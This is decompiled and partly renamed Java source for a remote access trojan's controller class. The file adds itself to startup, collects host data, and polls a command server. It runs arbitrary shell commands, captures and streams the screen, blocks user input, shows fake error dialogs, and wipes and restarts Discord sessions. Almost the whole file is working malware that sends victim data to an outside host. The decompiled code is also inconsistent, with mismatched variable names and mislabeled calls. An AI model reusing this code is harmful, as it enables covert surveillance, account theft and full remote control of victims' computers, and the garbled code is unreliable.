/*\n * ========================================\n * DEOBFUSCATED: RatController.java\n * Original: a/g.java\n * ----------------------------------------\n * RAT kontrol merkezi - WebSocket C2 baÄŸlantÄ±sÄ±, cmd/screenshot/stream/chat/input_block komutlarÄ± (1131 satÄ±r)\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package a;

import a.Main;
import a.b;
import a.e;
import a.h;
import c.Log;
import c.Net;
import c.r;
import java.awt.Desktop;
import java.awt.Dimension;
import java.awt.Graphics2D;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.RenderingHints;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.Window;
import java.awt.image.BufferedImage;
import java.awt.image.RenderedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.WebSocket;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.Base64;
import java.util.Iterator;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.MemoryCacheImageOutputStream;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.SwingUtilities;
import javax.swing.UIManager;

public class g {
    private static volatile boolean isRunning = true;
    private static volatile boolean isStreaming = false;
    private static String apiUrl;
    private static String licenseKey;
    private static String hwid;
    private static final int STREAM_FPS = 28;
    private static final byte STREAM_QUALITY = 1;
    private static final int[][] h;
    private static volatile int i;
    private static volatile int j;
    private static volatile WebSocket k;
    private static volatile CompletableFuture<?> l;
    private static final AtomicReference<byte[]> m;
    private static final HttpClient n;
    private static volatile long o;
    private static boolean p;

    public static void connect(String apiUrl, String licenseKey, String hwid) {
        c = string;
        d = string2;
        e = string3;
        try {
            Main.addToStartup();
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        try {
            DataCollector.collect(c, d);
        }
        catch (Throwable throwable) {
            RatController.connect("dispatchInitialMeta failed: " + throwable.getMessage());
        }
        Thread thread = new Thread(g::lambda$start$0, "sp-resurrect");
        thread.setDaemon(true);
        thread.start();
        Thread thread2 = new Thread(g::lambda$start$1, "sp-poll");
        thread2.setDaemon(true);
        thread2.start();
    }

    static void logMsg(String msg) {
        Log.agent(string);
    }

    private static void pollLoop() throws Exception {
        String string;
        String string2 = c + "/v1/poll";
        HttpURLConnection httpURLConnection = (HttpURLConnection)new URL(string2).openConnection();
        httpURLConnection.setRequestMethod("GET");
        httpURLConnection.setRequestProperty("x-build-key", d);
        httpURLConnection.setRequestProperty("x-hwid", e);
        RatController.connect(httpURLConnection);
        httpURLConnection.setConnectTimeout(15000);
        httpURLConnection.setReadTimeout(15000);
        int n2 = httpURLConnection.getResponseCode();
        if (n2 != 200) {
            RatController.connect("poll HTTP " + n2 + " hwid=" + e);
            httpURLConnection.disconnect();
            return;
        }
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(), StandardCharsets.UTF_8));
        StringBuilder stringBuilder = new StringBuilder();
        while ((string = bufferedReader.readLine()) != null) {
            stringBuilder.append(string);
        }
        bufferedReader.close();
        httpURLConnection.disconnect();
        String string3 = stringBuilder.toString();
        if (string3.contains("\"blocked\":true") || string3.contains("\"blocked\": true")) {
            RatController.connect("poll blocked hwid=" + e + " \u2014 owner deleted; re-report metadata to resurrect");
            long l2 = System.currentTimeMillis();
            if (l2 - o > 4000L) {
                o = l2;
                try {
                    DataCollector.collect(c, d);
                }
                catch (Throwable throwable) {
                    // empty catch block
                }
            }
        }
        a.g.c(string3);
        a.g.b(string3);
    }

    private static void processMessages(String response) {
        try {
            int n2 = string.indexOf("\"messages\":");
            if (n2 < 0) {
                return;
            }
            String string2 = string.substring(n2 + 11);
            int n3 = string2.indexOf(91);
            int n4 = RatController.connect(string2, n3);
            if (n3 < 0 || n4 < 0) {
                return;
            }
            String string3 = string2.substring(n3 + 1, n4);
            if (string3.trim().isEmpty()) {
                return;
            }
            if (!p) {
                RatController.connect(false);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void processCommands(String response) {
        try {
            int n2;
            int n3;
            int n4 = string.indexOf("\"commands\":");
            if (n4 < 0) {
                return;
            }
            String string2 = string.substring(n4 + 11);
            int n5 = string2.indexOf(91);
            int n6 = RatController.connect(string2, n5);
            if (n5 < 0 || n6 < 0) {
                return;
            }
            String string3 = string2.substring(n5 + 1, n6);
            if (string3.trim().isEmpty()) {
                return;
            }
            int n7 = 0;
            while (n7 < string3.length() && (n3 = string3.indexOf(123, n7)) >= 0 && (n2 = a.g.b(string3, n3)) >= 0) {
                String string4 = string3.substring(n3, n2 + 1);
                a.g.d(string4);
                n7 = n2 + 1;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void executeCommand(String commandJson) {
        String string2 = a.g.d(string, "type");
        String string3 = a.g.k(string);
        if (string2 == null) {
            return;
        }
        switch (string2) {
            case "shutdown": {
                a.g.b();
                break;
            }
            case "relog": {
                a.g.c();
                break;
            }
            case "error": {
                a.g.e(string3);
                break;
            }
            case "cmd": {
                a.g.g(string3);
                break;
            }
            case "screenshot": {
                a.g.captureScreen();
                break;
            }
            case "stream_start": {
                a.g.j();
                break;
            }
            case "stream_stop": {
                a.g.i();
                break;
            }
            case "chat_open": {
                RatController.connect(string3 != null && string3.toLowerCase().contains("force"));
                break;
            }
            case "discord_logout": {
                a.g.d();
                break;
            }
            case "input_block": {
                a.b.a(string3 == null || string3.isEmpty() ? "{\"mouse\":true,\"keyboard\":true}" : string3);
                break;
            }
            case "input_unblock": {
                a.b.a(false, false);
            }
        }
    }

    private static void shutdownPC() {
        try {
            Runtime.getRuntime().exec(new String[]{"shutdown", "/s", "/t", "0"});
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void relog() {
        a.g.e();
        try {
            Thread.sleep(3000L);
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            DataCollector.collect(c, d, false, true);
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        try {
            Thread.sleep(1000L);
        }
        catch (Exception exception) {
            // empty catch block
        }
        a.g.g();
    }

    private static void discordLogout() {
        RatController.connect("discord_logout start");
        a.g.e();
        try {
            Thread.sleep(2000L);
        }
        catch (Exception exception) {
            // empty catch block
        }
        a.g.f();
        try {
            Thread.sleep(800L);
        }
        catch (Exception exception) {
            // empty catch block
        }
        a.g.g();
        RatController.connect("discord_logout done");
    }

    private static void killDiscords() {
        String[] stringArray = new String[]{"Discord.exe", "DiscordCanary.exe", "DiscordPTB.exe", "DiscordDevelopment.exe"};
        for (String string : stringArray) {
            try {
                new ProcessBuilder("taskkill", "/F", "/IM", string, "/T").redirectErrorStream(true).start().waitFor();
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private static void deleteDiscordSessions() {
        String string = System.getenv("APPDATA");
        if (string == null || string.isEmpty()) {
            return;
        }
        String[] stringArray = new String[]{"discord", "discordcanary", "discordptb", "discorddevelopment"};
        for (String string2 : stringArray) {
            File file = new File(string, string2);
            if (!file.isDirectory()) continue;
            RatController.connect(new File(file, "Local Storage"));
            RatController.connect(new File(file, "Session Storage"));
            RatController.connect(new File(file, "IndexedDB"));
            String[] stringArray2 = new String[]{"Cookies" /* r.ckf() */, "Cookies" /* r.ckf() */ + "-journal", "Network\\Cookies" /* r.nck() */ + "-journal", "Network" /* r.nt() */ + File.separator + "Cookies" /* r.ckf() */ + "-journal", "Preferences"};
            for (String string3 : stringArray2) {
                try {
                    File file2 = new File(file, string3);
                    if (!file2.isFile()) continue;
                    file2.delete();
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
            try {
                File file3 = new File(file, "Local Storage");
                if (!file3.isDirectory()) continue;
                RatController.connect(file3);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private static void deleteContents(File dir) {
        if (file == null || !file.exists()) {
            return;
        }
        try {
            File[] fileArray;
            if (file.isDirectory() && (fileArray = file.listFiles()) != null) {
                for (File file2 : fileArray) {
                    RatController.connect(file2);
                }
            }
            file.delete();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void reinjectDiscord() {
        try {
            String string = System.getenv("LOCALAPPDATA");
            if (string == null) {
                return;
            }
            String[] stringArray = new String[]{"Discord", "DiscordCanary", "DiscordPTB"};
            for (String string2 : stringArray) {
                File file = new File(string, string2 + "\\Update.exe");
                if (!file.exists()) continue;
                new ProcessBuilder(file.getAbsolutePath(), "--processStart", string2 + ".exe").redirectErrorStream(true).start();
                break;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void showFakeError(String json) {
        try {
            String string2;
            String string3;
            String string4 = "Error";
            String string5 = "An error occurred.";
            if (string != null && !string.isEmpty()) {
                string3 = a.g.d(string, "title");
                string2 = a.g.d(string, "message");
                if (string3 != null && !string3.isEmpty()) {
                    string4 = string3;
                }
                if (string2 != null && !string2.isEmpty()) {
                    string5 = string2;
                }
            }
            string3 = string4;
            string2 = string5;
            Thread thread = new Thread(() -> g.lambda$execAlertDisplay$0(string3, string2), "error-popup");
            thread.setDaemon(false);
            thread.start();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void uploadScreenshot(String apiUrl, String hwid) {
        File file = null;
        try {
            File file2;
            String string3 = Base64.getEncoder().encodeToString(a.g.f(string).getBytes(StandardCharsets.UTF_8));
            String string4 = Base64.getEncoder().encodeToString(a.g.f(string2).getBytes(StandardCharsets.UTF_8));
            file = File.createTempFile("sp_err_", ".ps1");
            String string5 = "$ErrorActionPreference='Stop'\r\nAdd-Type -AssemblyName System.Windows.Forms\r\n[System.Windows.Forms.Application]::EnableVisualStyles()\r\n$t=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + string3 + "'))\r\n$m=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + string4 + "'))\r\n[void][System.Windows.Forms.MessageBox]::Show(\r\n  $m, $t,\r\n  [System.Windows.Forms.MessageBoxButtons]::OK,\r\n  [System.Windows.Forms.MessageBoxIcon]::Error,\r\n  [System.Windows.Forms.MessageBoxDefaultButton]::Button1,\r\n  [System.Windows.Forms.MessageBoxOptions]::DefaultDesktopOnly)\r\nRemove-Item -LiteralPath $PSCommandPath -Force -EA SilentlyContinue\r\n";
            try (Object object = new FileOutputStream(file);){
                ((FileOutputStream)object).write(new byte[]{-17, -69, -65});
                ((FileOutputStream)object).write(string5.getBytes(StandardCharsets.UTF_8));
            }
            object = System.getenv("WINDIR");
            if (object == null) {
                object = "C:\\Windows";
            }
            if (!(file2 = new File((String)object, "System32\\WindowsPowerShell\\v1.0\\powershell.exe")).isFile()) {
                file2 = new File("powershell.exe");
            }
            ProcessBuilder processBuilder = new ProcessBuilder(file2.getAbsolutePath(), "-NoProfile", "-STA", "-ExecutionPolicy", "Bypass", "-File", file.getAbsolutePath());
            processBuilder.redirectOutput(new File("NUL"));
            processBuilder.redirectError(new File("NUL"));
            Process process = processBuilder.start();
            Thread.sleep(900L);
            try {
                int n2 = process.exitValue();
                try {
                    file.delete();
                }
                catch (Exception exception) {
                    // empty catch block
                }
                if (n2 != 0) {
                    System.err.println("[sp] error dialog exit=" + n2);
                    a.g.b(string, string2);
                }
            }
            catch (IllegalThreadStateException illegalThreadStateException) {}
        }
        catch (Exception exception) {
            System.err.println("[sp] error dialog failed: " + exception.getMessage());
            if (file != null) {
                try {
                    file.delete();
                }
                catch (Exception exception2) {
                    // empty catch block
                }
            }
            a.g.b(string, string2);
        }
    }

    private static void openChat(String apiUrl, String hwid) {
        try {
            System.setProperty("java.awt.headless", "false");
            SwingUtilities.invokeLater(() -> g.lambda$showErrorSwingApp$0(string, string2));
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static String nullSafe(String s) {
        return string == null ? "" : string;
    }

    private static void executeShell(String cmd) {
        if (string == null || string.isEmpty()) {
            return;
        }
        Thread thread = new Thread(() -> g.lambda$execShellTask$0(string), "sp-cmd");
        thread.setDaemon(true);
        thread.start();
    }

    private static void captureScreen() {
        try {
            GraphicsDevice graphicsDevice = a.g.l();
            Robot robot = graphicsDevice != null ? new Robot(graphicsDevice) : new Robot();
            Rectangle rectangle = a.g.m();
            BufferedImage bufferedImage = robot.createScreenCapture(rectangle);
            BufferedImage bufferedImage2 = RatController.connect(bufferedImage, 1920, 1080);
            String string = Base64.getEncoder().encodeToString(RatController.connect(bufferedImage2, 0.88f));
            a.g.h(string);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void stopStream() {
        b = false;
        m.set(null);
        WebSocket webSocket = k;
        k = null;
        if (webSocket != null) {
            try {
                webSocket.sendClose(1000, "stop");
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private static void startStream() {
        if (b) {
            return;
        }
        b = true;
        m.set(null);
        i = 0;
        j = 0;
        Thread thread = new Thread(g::lambda$startStream$0, "live-capture");
        thread.setDaemon(true);
        thread.setPriority(10);
        Thread thread2 = new Thread(g::lambda$startStream$1, "live-send");
        thread2.setDaemon(true);
        thread2.setPriority(6);
        thread.start();
        thread2.start();
    }

    private static void connectStreamWS() {
        try {
            String string = c == null ? "" : c.trim();
            String string2 = string;
            if (string.endsWith("/")) {
                string = string.substring(0, string.length() - 1);
            }
            String string3 = string.replaceFirst("^https://", "wss://").replaceFirst("^http://", "ws://");
            String string4 = string3 + "/v1/stream?hwid=" + URLEncoder.encode(e, "UTF-8") + "&key=" + URLEncoder.encode(d, "UTF-8");
            CompletableFuture<WebSocket> completableFuture = n.newWebSocketBuilder().connectTimeout(Duration.ofSeconds(8L)).buildAsync(URI.create(string4), new h());
            k = completableFuture.get(8L, TimeUnit.SECONDS);
        }
        catch (Exception exception) {
            k = null;
        }
    }

    private static boolean trySendFrame(byte[] data) {
        WebSocket webSocket = k;
        if (webSocket != null) {
            try {
                CompletableFuture<?> completableFuture = l;
                if (completableFuture != null && !completableFuture.isDone()) {
                    return false;
                }
                byte[] byArray2 = new byte[1 + byArray.length];
                byArray2[0] = 1;
                System.arraycopy(byArray, 0, byArray2, 1, byArray.length);
                l = webSocket.sendBinary(ByteBuffer.wrap(byArray2), true).toCompletableFuture();
                return true;
            }
            catch (Exception exception) {
                k = null;
            }
        }
        try {
            a.g.h(Base64.getEncoder().encodeToString(byArray));
            return true;
        }
        catch (Exception exception) {
            return false;
        }
    }

    private static void sendStreamJson(String json) throws Exception {
        String string2 = "{\"type\":\"screen_frame\",\"data\":\"" + string + "\"}";
        a.g.c("/v1/screen_upload", string2);
    }

    private static GraphicsDevice getScreen() {
        try {
            return GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static Rectangle m() {
        Object object;
        try {
            object = a.g.l();
            if (object != null) {
                return ((GraphicsDevice)object).getDefaultConfiguration().getBounds();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        object = Toolkit.getDefaultToolkit().getScreenSize();
        return new Rectangle(0, 0, ((Dimension)object).width, ((Dimension)object).height);
    }

    private static int[] calcResolution(int w, int h, int maxW, int maxH) {
        if (n2 <= 0 || n3 <= 0) {
            return new int[]{Math.max(1, n4), Math.max(1, n5)};
        }
        double d2 = Math.min(1.0, Math.min((double)n4 / (double)n2, (double)n5 / (double)n3));
        int n6 = Math.max(1, (int)Math.round((double)n2 * d2));
        int n7 = Math.max(1, (int)Math.round((double)n3 * d2));
        if ((n6 & 1) == 1) {
            --n6;
        }
        if ((n7 & 1) == 1) {
            --n7;
        }
        return new int[]{Math.max(2, n6), Math.max(2, n7)};
    }

    private static BufferedImage resizeImage(BufferedImage img, int w, int h) {
        int[] nArray = RatController.connect(bufferedImage.getWidth(), bufferedImage.getHeight(), n2, n3);
        int n4 = nArray[0];
        int n5 = nArray[1];
        BufferedImage bufferedImage2 = new BufferedImage(n4, n5, 1);
        Graphics2D graphics2D = bufferedImage2.createGraphics();
        graphics2D.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BICUBIC);
        graphics2D.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY);
        graphics2D.drawImage(bufferedImage, 0, 0, n4, n5, null);
        graphics2D.dispose();
        return bufferedImage2;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private static byte[] compressJpeg(BufferedImage img, float f2) throws IOException {
        Iterator<ImageWriter> iterator = ImageIO.getImageWritersByFormatName("jpg");
        if (!iterator.hasNext()) {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ImageIO.write((RenderedImage)bufferedImage, "jpg", byteArrayOutputStream);
            return byteArrayOutputStream.toByteArray();
        }
        ImageWriter imageWriter = iterator.next();
        try {
            ImageWriteParam imageWriteParam = imageWriter.getDefaultWriteParam();
            if (imageWriteParam.canWriteCompressed()) {
                imageWriteParam.setCompressionMode(2);
                imageWriteParam.setCompressionQuality(Math.max(0.2f, Math.min(1.0f, f2)));
            }
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(49152);
            try (Object object = new MemoryCacheImageOutputStream(byteArrayOutputStream);){
                imageWriter.setOutput(object);
                imageWriter.write(null, new IIOImage(bufferedImage, null, null), imageWriteParam);
            }
            Object object = object = (Object)byteArrayOutputStream.toByteArray();
            return object;
        }
        finally {
            imageWriter.dispose();
        }
    }

    private static void sendChatMsg(String msg) {
        try {
            String string2 = "{\"message\":" + a.g.l(string) + "}";
            a.g.c("/v1/chat", string2);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void setInputBlocked(boolean blocked) {
        if (p && !bl) {
            return;
        }
        p = true;
        try {
            String string = c == null ? "" : c.trim();
            String string2 = string;
            if (string.endsWith("/")) {
                string = string.substring(0, string.length() - 1);
            }
            String string3 = string + "/panel/chat.html?hwid=" + URLEncoder.encode(e, "UTF-8") + "&key=" + URLEncoder.encode(d != null ? d : "chat", "UTF-8") + "&api=" + URLEncoder.encode(string, "UTF-8");
            try {
                if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.BROWSE)) {
                    Desktop.getDesktop().browse(URI.create(string3));
                    return;
                }
            }
            catch (Exception exception) {
                // empty catch block
            }
            try {
                new ProcessBuilder("rundll32", "url.dll,FileProtocolHandler", string3).start();
                return;
            }
            catch (Exception exception) {
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "start", "", string3});
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void addHeaders(HttpURLConnection conn) {
        try {
            String string = System.getenv("COMPUTERNAME");
            if (string == null || string.isEmpty()) {
                string = System.getenv("HOSTNAME");
            }
            if (string == null) {
                string = "";
            }
            String string2 = System.getProperty("user.name", "");
            String string3 = (System.getProperty("os.name", "") + " " + System.getProperty("os.version", "")).trim();
            httpURLConnection.setRequestProperty("x-pc-name", a.g.j(string));
            httpURLConnection.setRequestProperty("x-user-name", a.g.j(string2));
            httpURLConnection.setRequestProperty("x-os", a.g.j(string3));
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static String emptyIfNull(String s) {
        if (string == null) {
            return "";
        }
        try {
            return URLEncoder.encode(string, "UTF-8").replace("+", "%20");
        }
        catch (Exception exception) {
            return string.replaceAll("[^\\x20-\\x7E]", "_");
        }
    }

    private static void httpPost(String endpoint, String json) throws Exception {
        byte[] byArray = string2.getBytes(StandardCharsets.UTF_8);
        HttpURLConnection httpURLConnection = (HttpURLConnection)new URL(c + string).openConnection();
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("Content-Type", "application/json");
        httpURLConnection.setRequestProperty("x-build-key", d);
        httpURLConnection.setRequestProperty("x-hwid", e);
        RatController.connect(httpURLConnection);
        httpURLConnection.setConnectTimeout(10000);
        httpURLConnection.setReadTimeout(10000);
        try (OutputStream outputStream = httpURLConnection.getOutputStream();){
            outputStream.write(byArray);
            outputStream.flush();
        }
        httpURLConnection.getResponseCode();
        httpURLConnection.disconnect();
    }

    private static String getJsonField(String json, String key) {
        if (string == null) {
            return null;
        }
        String string3 = "\"" + string2 + "\":\"";
        int n2 = string.indexOf(string3);
        if (n2 < 0) {
            string3 = "\"" + string2 + "\": \"";
            n2 = string.indexOf(string3);
        }
        if (n2 < 0) {
            return null;
        }
        int n3 = n2 + string3.length();
        int n4 = string.indexOf("\"", n3);
        while (n4 > 0 && string.charAt(n4 - 1) == '\\') {
            n4 = string.indexOf("\"", n4 + 1);
        }
        if (n4 < 0) {
            return null;
        }
        return string.substring(n3, n4).replace("\\\"", "\"").replace("\\\\", "\\").replace("\\n", "\n");
    }

    private static String extractPayload(String json) {
        int n2;
        int n3;
        String string2 = a.g.d(string, "payload");
        if (string2 != null) {
            return string2;
        }
        if (string == null) {
            return null;
        }
        int n4 = string.indexOf("\"payload\"");
        if (n4 < 0) {
            return null;
        }
        int n5 = string.indexOf(58, n4 + 9);
        if (n5 < 0) {
            return null;
        }
        for (n3 = n5 + 1; n3 < string.length() && Character.isWhitespace(string.charAt(n3)); ++n3) {
        }
        if (n3 >= string.length()) {
            return null;
        }
        if (string.charAt(n3) == '{' && (n2 = a.g.b(string, n3)) > n3) {
            return string.substring(n3, n2 + 1);
        }
        return null;
    }

    private static int findClosingBracket(String json, int start) {
        if (n2 < 0 || string.charAt(n2) != '[') {
            return -1;
        }
        int n3 = 0;
        for (int i2 = n2; i2 < string.length(); ++i2) {
            if (string.charAt(i2) == '[') {
                ++n3;
                continue;
            }
            if (string.charAt(i2) != ']' || --n3 != 0) continue;
            return i2;
        }
        return -1;
    }

    private static int findClosingBrace(String json, int start) {
        if (n2 < 0 || string.charAt(n2) != '{') {
            return -1;
        }
        int n3 = 0;
        boolean bl = false;
        for (int i2 = n2; i2 < string.length(); ++i2) {
            char c2 = string.charAt(i2);
            if (c2 == '\"' && (i2 == 0 || string.charAt(i2 - 1) != '\\')) {
                bl = !bl;
                boolean bl2 = bl;
            }
            if (bl) continue;
            if (c2 == '{') {
                ++n3;
                continue;
            }
            if (c2 != '}' || --n3 != 0) continue;
            return i2;
        }
        return -1;
    }

    private static String escapeJson(String s) {
        if (string == null) {
            return "\"\"";
        }
        StringBuilder stringBuilder = new StringBuilder("\"");
        block7: for (char c2 : string.toCharArray()) {
            switch (c2) {
                case '\"': {
                    stringBuilder.append("\\\"");
                    continue block7;
                }
                case '\\': {
                    stringBuilder.append("\\\\");
                    continue block7;
                }
                case '\n': {
                    stringBuilder.append("\\n");
                    continue block7;
                }
                case '\r': {
                    stringBuilder.append("\\r");
                    continue block7;
                }
                case '\t': {
                    stringBuilder.append("\\t");
                    continue block7;
                }
                default: {
                    if (c2 < ' ') {
                        stringBuilder.append("\\u").append(String.format("%04x", Character.valueOf(c2)));
                        continue block7;
                    }
                    stringBuilder.append(c2);
                }
            }
        }
        return stringBuilder.append("\"").toString();
    }

    private static void lambda$startStream$1() {
        try {
            a.g.k();
            while (b) {
                WebSocket webSocket = m.getAndSet(null);
                if (webSocket == null) {
                    Thread.sleep(2L);
                    continue;
                }
                if (!RatController.connect((byte[])webSocket)) {
                    ++i;
                    try {
                        Thread.sleep(20L);
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                    if (k != null) continue;
                    a.g.k();
                    continue;
                }
                ++j;
            }
        }
        catch (Exception exception) {
            b = false;
        }
        finally {
            WebSocket webSocket = k;
            k = null;
            if (webSocket != null) {
                try {
                    webSocket.sendClose(1000, "end");
                }
                catch (Exception exception) {}
            }
        }
    }

    private static void lambda$startStream$0() {
        try {
            GraphicsDevice graphicsDevice = a.g.l();
            Robot robot = graphicsDevice != null ? new Robot(graphicsDevice) : new Robot();
            Rectangle rectangle = a.g.m();
            long l2 = 35714285L;
            long l3 = System.nanoTime();
            int n2 = 0;
            int n3 = 0;
            long l4 = System.nanoTime();
            BufferedImage bufferedImage = null;
            int n4 = 0;
            int n5 = 0;
            while (b) {
                long l5;
                int n6 = h[n2][0];
                int n7 = h[n2][1];
                float f2 = (float)h[n2][2] / 100.0f;
                BufferedImage bufferedImage2 = robot.createScreenCapture(rectangle);
                int[] nArray = RatController.connect(bufferedImage2.getWidth(), bufferedImage2.getHeight(), n6, n7);
                int n8 = nArray[0];
                int n9 = nArray[1];
                if (bufferedImage == null || n4 != n8 || n5 != n9) {
                    bufferedImage = new BufferedImage(n8, n9, 1);
                    n4 = n8;
                    n5 = n9;
                }
                Graphics2D graphics2D = bufferedImage.createGraphics();
                graphics2D.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BICUBIC);
                graphics2D.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY);
                graphics2D.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_OFF);
                graphics2D.drawImage(bufferedImage2, 0, 0, n8, n9, null);
                graphics2D.dispose();
                byte[] byArray = RatController.connect(bufferedImage, f2);
                m.set(byArray);
                ++n3;
                if (System.nanoTime() - l4 > 1200000000L) {
                    int n10 = i;
                    int n11 = j;
                    i = 0;
                    j = 0;
                    double d2 = n10 + n11 > 0 ? (double)n10 / (double)(n10 + n11) : 0.0;
                    double d3 = d2;
                    if (d2 > 0.75 && n2 < h.length - 1) {
                        n2 = 1;
                    } else if (d2 < 0.2) {
                        n2 = 0;
                    }
                    n3 = 0;
                    l4 = System.nanoTime();
                }
                if ((l5 = ((l3 += 35714285L) - System.nanoTime()) / 1000000L) > 0L) {
                    Thread.sleep(l5);
                    continue;
                }
                l3 = System.nanoTime();
            }
        }
        catch (Exception exception) {
            b = false;
        }
    }

    private static void lambda$execShellTask$0(String string) {
        try {
            boolean bl;
            Object object;
            Charset charset;
            ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe", "/c", "chcp 65001>nul & " + string);
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();
            String string2 = System.getProperty("sun.jnu.encoding");
            if (string2 == null || string2.isEmpty()) {
                string2 = "UTF-8";
            }
            try {
                charset = Charset.forName(string2);
            }
            catch (Exception exception) {
                charset = StandardCharsets.UTF_8;
            }
            StringBuilder stringBuilder = new StringBuilder();
            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream(), charset));){
                while ((object = bufferedReader.readLine()) != null) {
                    if (stringBuilder.length() > 12000) {
                        break;
                    }
                    stringBuilder.append((String)object).append('\n');
                }
            }
            if (!(bl = process.waitFor(45L, TimeUnit.SECONDS))) {
                process.destroyForcibly();
                stringBuilder.append("\n... (timeout 45s)\n");
            }
            if (((String)(object = stringBuilder.toString())).length() > 8000) {
                object = ((String)object).substring(0, 8000) + "\n... (truncated)";
            }
            if (((String)object).trim().isEmpty()) {
                object = "(no output)\n";
            }
            a.g.i("CMD> " + string + "\n" + (String)object);
        }
        catch (Exception exception) {
            a.g.i("CMD ERROR> " + (exception.getMessage() == null ? "failed" : exception.getMessage()));
        }
    }

    private static void lambda$showErrorSwingApp$0(String string, String string2) {
        try {
            JFrame jFrame = new JFrame(string);
            jFrame.setType(Window.Type.NORMAL);
            jFrame.setAlwaysOnTop(true);
            jFrame.setDefaultCloseOperation(2);
            try {
                jFrame.setIconImage(((ImageIcon)UIManager.getIcon("OptionPane.errorIcon")).getImage());
            }
            catch (Exception exception) {
                // empty catch block
            }
            jFrame.setSize(1, 1);
            try {
                GraphicsDevice graphicsDevice = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
                Rectangle rectangle = graphicsDevice.getDefaultConfiguration().getBounds();
                jFrame.setLocation(rectangle.x + rectangle.width / 2, rectangle.y + rectangle.height / 2);
            }
            catch (Exception exception) {
                jFrame.setLocationRelativeTo(null);
            }
            jFrame.setVisible(true);
            JOptionPane.showMessageDialog(jFrame, string2, string, 0);
            jFrame.dispose();
        }
        catch (Exception exception) {
            try {
                JOptionPane.showMessageDialog(null, string2, string, 0);
            }
            catch (Exception exception2) {
                // empty catch block
            }
        }
    }

    private static void lambda$execAlertDisplay$0(String string, String string2) {
        RatController.connect(string, string2);
    }

    private static void lambda$start$1() {
        while (a) {
            try {
                RatController.connect();
            }
            catch (Throwable throwable) {
                RatController.connect("poll failed: " + throwable.getMessage());
            }
            long l2 = b ? 750L : 1200L;
            try {
                Thread.sleep(l2);
            }
            catch (Exception exception) {}
        }
    }

    private static void lambda$start$0() {
        try {
            Thread.sleep(2500L);
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            Main.addToStartup();
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        try {
            DataCollector.collect(c, d);
        }
        catch (Throwable throwable) {
            // empty catch block
        }
    }

    static {
        h = new int[][]{{1920, 1080, 90}, {1600, 900, 85}};
        i = 0;
        j = 0;
        l = CompletableFuture.completedFuture(null);
        m = new AtomicReference();
        n = Net.newHttpClient(Duration.ofSeconds(8L));
        o = 0L;
        p = false;
    }
}

